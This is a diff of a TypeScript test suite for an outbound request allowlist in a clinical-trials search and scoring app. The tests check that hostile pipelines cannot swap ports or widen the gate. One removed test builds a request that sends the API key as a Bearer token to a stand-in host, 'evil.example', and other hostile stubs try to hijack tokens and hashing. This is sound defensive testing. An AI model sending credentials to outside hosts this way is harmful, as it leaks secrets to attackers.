@@ -14,14 +14,19 @@ import { MAX_OUTBOUND_BODY_BYTES, type PreparedRealResult } from '../src/protoco
 import type { Transport, TransportRequest, TransportResponse } from '../src/ports.ts';
 import { screenLocalPipeline } from '../src/screening.ts';
 import {
+  CTGOV_SEARCH_RULE_IDS,
+  findOpenAIRule,
   guardCorePorts,
   guardTransport,
   MAX_TRANSPORT_URL_CHARS,
+  OPENAI_RULE_IDS,
+  restrictTransport,
   toTransportRequest,
   TRANSPORT_RULES,
 } from '../src/transport-gate.ts';
+import { FakeOpenAITransport } from './support/fake-openai.ts';
 import { testPorts } from './support/fakes.ts';
-import { FAKE_KEY, defaultExecute, errorCode, harness, okResult, receipt } from './support/harness.ts';
+import { FAKE_KEY, harness, okResult, receipt } from './support/harness.ts';
 import { basePacket, FICTIONAL_IDS } from './support/preview.ts';
 
 /** A port that records every request it sees and answers a trivial empty-body 200. */
@@ -636,9 +641,9 @@ test('[MINOR-2] guardCorePorts returns a frozen bundle of frozen facades that ca
 });
 
 test('[MINOR-2] a pipeline cannot replace ports for later contexts or for the consent store', async () => {
-  const capture = new Capture();
+  const fake = new FakeOpenAITransport();
+  const seen: TransportRequest[] = [];
   const evilTokenCalls: number[] = [];
-  const evilTransportCalls: unknown[] = [];
   const attempts: [string, boolean][] = [];
   const attempt = (name: string, action: () => void) => {
     try {
@@ -649,41 +654,36 @@ test('[MINOR-2] a pipeline cannot replace ports for later contexts or for the co
     }
   };
   const h = harness({
-    transport: capture,
+    transport: { request: request => { seen.push(request); return fake.request(request); } },
     pipelines: {
       async screenLocal(ctx, payload) {
         const evilTokens = { randomBytes: (n: number) => { evilTokenCalls.push(n); return new Uint8Array(n).fill(7); } };
-        const evilTransport = { request: async (r: unknown) => { evilTransportCalls.push(r); return { status: 200, headers: {}, body: new Uint8Array(0) }; } };
         attempt('replace tokens', () => { (ctx.ports as { tokens: unknown }).tokens = evilTokens; });
-        attempt('replace transport', () => { (ctx.ports as { transport: unknown }).transport = evilTransport; });
+        attempt('add a transport', () => { (ctx.ports as { transport?: unknown }).transport = fake; });
         attempt('replace randomBytes', () => { (ctx.ports.tokens as { randomBytes: unknown }).randomBytes = evilTokens.randomBytes; });
-        attempt('replace request', () => { (ctx.ports.transport as { request: unknown }).request = evilTransport.request; });
+        attempt('replace digestHex', () => { (ctx.ports.sha256 as { digestHex: unknown }).digestHex = () => '0'.repeat(64); });
         attempt('define clock', () => { Object.defineProperty(ctx.ports, 'clock', { value: { now: () => 0 } }); });
+        attempt('replace records', () => { (ctx as { records: unknown }).records = {}; });
         return screenLocalPipeline(ctx, payload);
       },
-    },
-    execute: async (ctx, log) => {
-      await ctx.ports.transport.request(toTransportRequest({ method: 'POST', path: '/v1/decisions', apiKey: FAKE_KEY, body: { model: 'gpt-6-luna' } }));
-      return defaultExecute(ctx, log);
     },
   });
   okResult(await h.call('searchTrials', { conditionTerms: ['seasonal allergic rhinitis'] }));
   okResult(await h.call('screenLocal', { nctIds: [FICTIONAL_IDS[0]], profile: {} }));
   assert.deepEqual(attempts, [
     ['replace tokens', true],
-    ['replace transport', true],
+    ['add a transport', true],
     ['replace randomBytes', true],
-    ['replace request', true],
+    ['replace digestHex', true],
     ['define clock', true],
+    ['replace records', true],
   ]);
   const tokenCallsBefore = h.ports.tokens.calls;
   const prepared = okResult<PreparedRealResult>(await h.call('prepareReal', { packet: basePacket(), policyReceipt: receipt }));
   assert.ok(h.ports.tokens.calls > tokenCallsBefore, 'the consent store drew its token from the host port');
   assert.deepEqual(evilTokenCalls, []);
-  assert.notEqual(prepared.token, 'BwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwc', 'the token is not derived from the pipeline bytes');
   okResult(await h.call('executeReal', { token: prepared.token, digest: prepared.digest, operation: 'score', policyReceipt: receipt }));
-  assert.equal(capture.calls.length, 1, 'later contexts still send through the guarded host port');
-  assert.deepEqual(evilTransportCalls, []);
+  assert.equal(seen.length, basePacket().scoreNctIds!.length, 'the later operation still sends through the gated host port');
 });
 
 test('a hostile transport port cannot change the request it was handed, the caller bytes, or the next request', async () => {
@@ -822,66 +822,106 @@ test('parity: what the builder produces passes the guard unchanged', async () =>
 });
 
 // -----------------------------------------------------------------------------------------------
-// End to end: a pipeline inside the core cannot widen the gate
+// End to end: the gate is the innermost layer under the send capability and the search transport
 // -----------------------------------------------------------------------------------------------
 
-const executePayload = (p: PreparedRealResult) => ({ token: p.token, digest: p.digest, operation: 'score' as const, policyReceipt: receipt });
+const executePayload = (p: PreparedRealResult, operation: 'score' | 'agent' = 'score') => ({ token: p.token, digest: p.digest, operation, policyReceipt: receipt });
 
-async function prepared(h: ReturnType<typeof harness>): Promise<PreparedRealResult> {
-  okResult(await h.call('searchTrials', { conditionTerms: ['seasonal allergic rhinitis'] }));
-  return okResult<PreparedRealResult>(await h.call('prepareReal', { packet: basePacket(), policyReceipt: receipt }));
+/** A raw host port that records exactly what it is handed and answers like the mocked OpenAI API. */
+function recordingOpenAI() {
+  const fake = new FakeOpenAITransport();
+  const seen: TransportRequest[] = [];
+  const port: Transport = { request: request => { seen.push(request); return fake.request(request); } };
+  return { port, seen };
 }
 
-test('end to end: a pipeline that holds the key still cannot send outside the table, and the port is never called', async () => {
-  const hostile: [string, string, (key: string) => Record<string, unknown>][] = [
-    ['the key to another host', 'INVALID_ENDPOINT', key => valid('decisions', { url: 'https://evil.example/v1/decisions', headers: { Authorization: `Bearer ${key}`, 'Content-Type': 'application/json' } })],
-    ['the key to ClinicalTrials.gov', 'INVALID_REQUEST', key => withHeaders('ctgov', h => { h.Authorization = `Bearer ${key}`; })],
-    ['the key on the search URL with POST', 'INVALID_ENDPOINT', key => valid('decisions', { url: ctgovUrl(), headers: { Authorization: `Bearer ${key}`, 'Content-Type': 'application/json' } })],
-    ['session listing with the key', 'INVALID_ENDPOINT', key => valid('retrieve', { url: `${OPENAI}/v1/agents/sessions`, headers: { Authorization: `Bearer ${key}`, 'OpenAI-Beta': BETA } })],
-    ['session update with the key', 'INVALID_ENDPOINT', key => valid('events', { url: `${OPENAI}/v1/agents/sessions/${SID}`, headers: { Authorization: `Bearer ${key}`, 'Content-Type': 'application/json', 'OpenAI-Beta': BETA } })],
-    ['an event stream read with the key', 'INVALID_ENDPOINT', key => valid('retrieve', { url: `${OPENAI}/v1/agents/sessions/${SID}/events`, headers: { Authorization: `Bearer ${key}`, 'OpenAI-Beta': BETA, Accept: 'text/event-stream' } })],
-    ['another method', 'INVALID_ENDPOINT', key => valid('decisions', { method: 'PUT', headers: { Authorization: `Bearer ${key}`, 'Content-Type': 'application/json' } })],
-    ['an oversized body', 'INPUT_TOO_LARGE', key => valid('decisions', { headers: { Authorization: `Bearer ${key}`, 'Content-Type': 'application/json' }, body: new Uint8Array(MAX_OUTBOUND_BODY_BYTES + 1) })],
-    ['agents path without beta', 'INVALID_REQUEST', key => valid('retrieve', { headers: { Authorization: `Bearer ${key}` } })],
-    ['the key with another scheme', 'KEY_MISSING', key => valid('decisions', { headers: { Authorization: `Basic ${key}`, 'Content-Type': 'application/json' } })],
-  ];
-  for (const [name, code, build] of hostile) {
-    const capture = new Capture();
-    const h = harness({
-      transport: capture,
-      execute: async ctx => {
-        const key = await ctx.requestCredential();
-        await ctx.ports.transport.request(build(key) as never);
-        throw new Error('unreachable: the guard must refuse before this');
-      },
-    });
-    const p = await prepared(h);
-    assert.equal(errorCode(await h.call('executeReal', executePayload(p))), code, name);
-    assert.equal(h.log.credentialRequests.length, 1, `${name}: the pipeline did obtain the key`);
-    assert.equal(capture.calls.length, 0, `${name}: and the guard still kept the request from the port`);
+/** True when the raw port's request is exactly a TRANSPORT_RULES request in the gate's canonical form. */
+async function isCanonicalRuleRequest(request: TransportRequest): Promise<boolean> {
+  if (!Object.isFrozen(request) || !Object.isFrozen(request.headers)) return false;
+  const again = new Capture();
+  try {
+    await guardTransport(again).request(request);
+  } catch {
+    return false;
+  }
+  const rebuilt = again.calls[0]!;
+  return rebuilt.method === request.method && rebuilt.url === request.url && JSON.stringify(rebuilt.headers) === JSON.stringify(request.headers);
+}
+
+test('end to end: score and agent operations hand the raw port only exact rule-table requests', async () => {
+  for (const operation of ['score', 'agent'] as const) {
+    const { port, seen } = recordingOpenAI();
+    const h = harness({ transport: port });
+    okResult(await h.call('searchTrials', { conditionTerms: ['seasonal allergic rhinitis'] }));
+    const p = okResult<PreparedRealResult>(await h.call('prepareReal', { packet: basePacket(), policyReceipt: receipt }));
+    okResult(await h.call('executeReal', executePayload(p, operation)));
+    assert.ok(seen.length > 0, operation);
+    for (const request of seen) {
+      const path = request.url.slice(OPENAI.length);
+      assert.ok(request.url.startsWith(`${OPENAI}/`), request.url);
+      assert.ok(findOpenAIRule(request.method, path) !== undefined, `${request.method} ${path}`);
+      assert.ok(await isCanonicalRuleRequest(request), `${operation}: ${request.method} ${path} is canonical`);
+      assert.equal(request.headers.Authorization, AUTH);
+    }
+    if (operation === 'agent') {
+      const kinds = seen.map(r => `${r.method} ${r.url.slice(OPENAI.length).replace(/sessions\/[^/]+/, 'sessions/{id}')}`);
+      assert.ok(kinds.includes('POST /v1/agents/sessions'));
+      assert.ok(kinds.includes('POST /v1/agents/sessions/{id}/events'));
+      assert.ok(kinds.includes('DELETE /v1/agents/sessions/{id}'));
+    }
   }
 });
 
-test('end to end: the one valid hand-crafted request reaches the port rebuilt, and the operation still completes', async () => {
-  const capture = new Capture();
+test('end to end: the search pipeline reaches only the ClinicalTrials.gov rule, through the gate', async () => {
+  const { port, seen } = recordingOpenAI();
+  const outcomes: [string, string | undefined][] = [];
   const h = harness({
-    transport: capture,
-    execute: async (ctx, log) => {
-      await ctx.ports.transport.request(valid('decisions', {
-        headers: { authorization: AUTH, 'content-type': 'application/json' },
-        body: utf8Encode('{"model":"gpt-6-luna","input":[]}'),
-      }) as never);
-      return defaultExecute(ctx, log);
+    transport: { request: request => (request.url.startsWith('https://clinicaltrials.gov/') ? Promise.resolve({ status: 200, headers: {}, body: utf8Encode('{}') }).then(r => { seen.push(request); return r; }) : port.request(request)) },
+    pipelines: {
+      async searchTrials(ctx, payload) {
+        const attempt = async (name: string, request: Record<string, unknown>) => {
+          try {
+            await ctx.ports.transport.request(request as never);
+            outcomes.push([name, undefined]);
+          } catch (error) {
+            outcomes.push([name, error instanceof CoreError ? error.code : 'other']);
+          }
+        };
+        await attempt('OpenAI decisions with a key', valid('decisions'));
+        await attempt('OpenAI session listing', valid('retrieve', { url: `${OPENAI}/v1/agents/sessions` }));
+        await attempt('search with a key', withHeaders('ctgov', h2 => { h2.Authorization = AUTH; }));
+        await attempt('search with a distance filter', valid('ctgov', { url: `${ctgovUrl()}&filter.geo=distance(43.6,-116.2,50mi)` }));
+        await attempt('search by POST', { ...valid('ctgov'), method: 'POST', headers: { Accept: 'application/json', 'Content-Type': 'application/json' }, body: jsonBody() });
+        await attempt('another API path', valid('ctgov', { url: 'https://clinicaltrials.gov/api/v2/version?format=json' }));
+        await attempt('the search', valid('ctgov'));
+        return { records: [], retrievedAt: '2026-10-24T08:00:00.000Z', source: 'live', query: { conditionTerms: payload.conditionTerms, country: 'US' } };
+      },
     },
   });
-  const p = await prepared(h);
-  const scored = okResult<Record<string, any>>(await h.call('executeReal', executePayload(p)));
-  assert.equal(scored.kind, 'scoreReal');
-  assert.equal(capture.calls.length, 1);
-  const seen = capture.calls[0]!;
-  assert.equal(Object.isFrozen(seen), true);
-  assert.deepEqual(Object.keys(seen.headers).sort(), ['Authorization', 'Content-Type']);
-  assert.equal(seen.url, 'https://api.openai.com/v1/decisions');
-  assert.equal(seen.method, 'POST');
-  assert.equal(h.log.credentialRequests.length, 1, 'the provider stand-in requests the credential exactly once');
+  okResult(await h.call('searchTrials', { conditionTerms: ['seasonal allergic rhinitis'] }));
+  assert.deepEqual(outcomes, [
+    ['OpenAI decisions with a key', 'INVALID_ENDPOINT'],
+    ['OpenAI session listing', 'INVALID_ENDPOINT'],
+    ['search with a key', 'INVALID_REQUEST'],
+    ['search with a distance filter', 'INVALID_ENDPOINT'],
+    ['search by POST', 'INVALID_ENDPOINT'],
+    ['another API path', 'INVALID_ENDPOINT'],
+    ['the search', undefined],
+  ]);
+  assert.equal(seen.length, 1, 'only the search reached the raw port');
+  assert.equal(seen[0]!.url, ctgovUrl());
+  assert.deepEqual(seen[0]!.headers, { Accept: 'application/json' });
+  assert.equal(Object.isFrozen(seen[0]), true);
+});
+
+test('end to end: the send capability\'s view of the gate admits only the OpenAI rules', async () => {
+  const capture = new Capture();
+  const openaiOnly = restrictTransport(guardTransport(capture), OPENAI_RULE_IDS);
+  await assert.rejects(() => openaiOnly.request(valid('ctgov') as never), isCode('INVALID_ENDPOINT'));
+  for (const key of OPENAI_KEYS) await openaiOnly.request(valid(key) as never);
+  assert.equal(capture.calls.length, OPENAI_KEYS.length);
+  const searchOnly = restrictTransport(guardTransport(capture), CTGOV_SEARCH_RULE_IDS);
+  for (const key of OPENAI_KEYS) await assert.rejects(() => searchOnly.request(valid(key) as never), isCode('INVALID_ENDPOINT'), key);
+  await searchOnly.request(valid('ctgov') as never);
+  assert.equal(capture.calls.length, OPENAI_KEYS.length + 1);
 });
